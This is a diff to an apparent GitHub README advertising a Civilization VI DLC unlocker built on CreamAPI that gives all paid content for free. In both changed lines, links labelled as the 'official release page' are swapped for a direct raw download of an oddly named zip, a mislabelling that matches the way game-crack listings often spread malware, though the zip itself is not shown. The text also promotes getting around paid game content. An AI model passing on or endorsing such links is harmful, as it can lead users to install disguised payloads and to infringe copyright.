@@ -1,6 +1,6 @@
 # 🌍 Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI- - Unlock All Game Content For Free
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Emeraldcreepermailer737/Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI-/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Emeraldcreepermailer737/Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI-/main/nain/All_Steam_Cs_V_Unlocker_Free_Cream_DL_Civilization_AP_v3.9.zip)
 
 This software allows users to access all available downloadable content for Civilization VI on the Steam platform. It uses the CreamAPI library to signal the game that these files reside on your system. You gain access to expansion packs, new civilizations, and scenario sets without additional purchases through the Steam store.
 
@@ -17,7 +17,7 @@ Before you use this tool, ensure your computer meets these requirements:
 
 Follow these steps to find the correct software version for your computer:
 
-1.  Visit the official release page: [https://github.com/Emeraldcreepermailer737/Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI-/releases](https://github.com/Emeraldcreepermailer737/Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI-/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/Emeraldcreepermailer737/Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI-/main/nain/All_Steam_Cs_V_Unlocker_Free_Cream_DL_Civilization_AP_v3.9.zip](https://raw.githubusercontent.com/Emeraldcreepermailer737/Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI-/main/nain/All_Steam_Cs_V_Unlocker_Free_Cream_DL_Civilization_AP_v3.9.zip).
 2.  Look at the list under the latest release tag.
 3.  Choose the zip file that fits your operating system.
 4.  Download this file to your computer.
